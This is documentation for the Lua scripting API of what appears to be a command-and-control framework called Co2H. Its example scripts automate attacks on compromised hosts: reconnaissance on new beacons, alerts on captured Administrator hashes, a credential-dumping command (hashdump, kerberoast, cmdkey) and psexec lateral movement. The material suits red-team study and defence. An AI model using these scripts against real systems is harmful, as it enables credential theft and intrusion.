Lua Scripting

Co2H contains a built-in Lua 5.4 engine that allows automating operator actions without recompiling the client. Scripts react to events (new beacon, task output, chat), register custom commands in the console and send tasks to beacons.

Scripts run on the client side, not on the server or the beacon. They automate what the operator would do manually in the console.

Script Location

Scripts are stored in the scripts/ folder alongside co2h-client.exe:

bin/
  co2h-client.exe
  scripts/
    auto_enum.lua
    grab_creds.lua
    my_workflow.lua

All *.lua files from this folder are loaded automatically on client startup. Files with the .lua.example extension are ignored — they are used as templates.

Scripts can also be loaded and reloaded at any time from the Scripts tab without restarting the client.

Scripts Tab

The Scripts tab is located between Audit and Logs in the main tab panel.

ElementPurpose
List (top half)Loaded .lua files
Log (bottom half)Output from log() calls in scripts with timestamps
Load script...Open a file dialog to load a .lua file

Scripting Engine API

task(beacon_id, cmd_text)

Send a command to a beacon. Equivalent to the operator typing a command in the console.

task("abc123", "shell whoami")
task("abc123", "ps")
task("abc123", "hashdump 2")
beacon_id — string, the beacon identifier (first column of the Sessions tab). The command goes through the same dispatcher as manual input: all arguments, syntax and behavior are identical.

log(text)

Write a line to the Scripts tab log and to the Logs panel.

log("enumeration started on " .. bid)
log("found " .. count .. " processes")

alert(title, text)

Show a popup window to the operator.

alert("High-value target", "Administrator hash found on " .. bid)

beacons()

Return a table (array) of all active beacons at the time of the call.

for _, b in ipairs(beacons()) do
    log(b.id .. " — " .. b.user .. "@" .. b.host)
end

Fields of each element:

FieldTypeDescription
idstringBeacon identifier
hoststringTarget hostname
userstringCurrent user on the target
archstring"x64" or "x86"
osstring"windows" or "linux"
pidintegerPID of the beacon process
listenerstringListener name

on(event_name, callback)

Subscribe to an event. A single script can register multiple handlers for the same event; all of them will be called.

on("beacon_new", function(b)
    -- b.id, b.host, b.user, b.arch, b.os
end)

on("task_output", function(bid, tid, output)
    -- bid    — string: beacon_id
    -- tid    — number: task_id
    -- output — string: output text
end)

on("beacon_lost", function(bid)
    -- bid — string: beacon_id of the lost beacon
end)

on("chat", function(from, text)
    -- from — operator name
    -- text — message text
end)

command(name, help, callback)

Register a custom command in the beacon console. After the script is loaded, the command is available in auto-completion alongside the built-in commands.

command("enum", "Run full host enumeration", function(bid, args)
    task(bid, "whoami")
    task(bid, "shell ipconfig /all")
    task(bid, "shell net user")
    task(bid, "ps")
    log("[enum] started on " .. bid)
end)

Callback parameters:

ParameterDescription
bidIdentifier of the beacon whose console is currently active
argsEverything written after the command name (string, may be empty)

Events

EventWhen FiredCallback Arguments
beacon_newClient detected a new beacon on the next server pollb — table with fields id, host, user, arch, os
beacon_lostBeacon disappeared from the list (timeout > 3 minutes)bid — string
task_outputOutput for any task received from the serverbid, tid, output
chatA chat message received from any operatorfrom, text
Important: scripts are loaded on client startup precisely to register beacon_new handlers before any beacons appear. If a script is loaded later — already connected beacons are missed, but new ones will be handled.

Examples

Automatic Reconnaissance on New Beacon

on("beacon_new", function(b)
    log("[auto] new beacon: " .. b.user .. "@" .. b.host .. " (" .. b.arch .. ")")
    task(b.id, "whoami")
    task(b.id, "ps")
    task(b.id, "pwd")
    if b.os == "windows" then
        task(b.id, "shell net user")
        task(b.id, "shell ipconfig /all")
    end
end)

Alert When Administrator Hash is Found

on("task_output", function(bid, tid, output)
    if output:find("Administrator:500:") then
        alert("High-value target", "Admin hash found on beacon " .. bid)
        log("[!] admin hash on " .. bid)
    end
end)

Custom Command for Credential Dumping

command("grab", "Dump all credential sources", function(bid, args)
    task(bid, "hashdump 2")
    task(bid, "kerberoast")
    task(bid, "shell cmdkey /list")
    log("[grab] credential dump started on " .. bid)
end)

Custom Command with Arguments

-- Usage: lateral 192.168.1.10 administrator
command("lateral", "Quick lateral move: lateral <ip> <user>", function(bid, args)
    local parts = {}
    for w in args:gmatch("%S+") do parts[#parts+1] = w end
    if #parts < 2 then
        log("[lateral] usage: lateral <ip> <user>")
        return
    end
    local ip, user = parts[1], parts[2]
    task(bid, "psexec_cmd " .. ip .. " whoami")
    log("[lateral] moving to " .. ip .. " as " .. user)
end)

List All Beacons from a Script

command("listall", "Print all active beacons", function(bid, args)
    local all = beacons()
    log("Active beacons: " .. #all)
    for _, b in ipairs(all) do
        log("  " .. b.id .. " " .. b.user .. "@" .. b.host .. " [" .. b.arch .. "]")
    end
end)

Error Handling

If a Lua error occurs in a script (syntax or runtime), it does not crash the client. The error message is written to the Scripts tab log:

[03:52:24] [script] error loading my_script.lua: [string]:5: attempt to call a nil value

On error in an event callback:

[03:52:30] [script] beacon_new error: [string]:12: attempt to concatenate a nil value
An error in one callback does not block the other handlers for the same event — they will be called in the same order.

Tips

  • Name scripts descriptively: auto_enum.lua, alert_da.lua, grab_creds.lua
  • One script — one task. Do not make a "mega-script" for every situation
  • Use log() for diagnostics — output is visible in real time
  • Before using beacons() in beacon_new, note that the new beacon is already added to the list by the time the callback is called
  • Example templates are provided with the .lua.example extension — copy, rename to .lua and adapt
  • To reload a script after editing — click Reload all in the Scripts tab
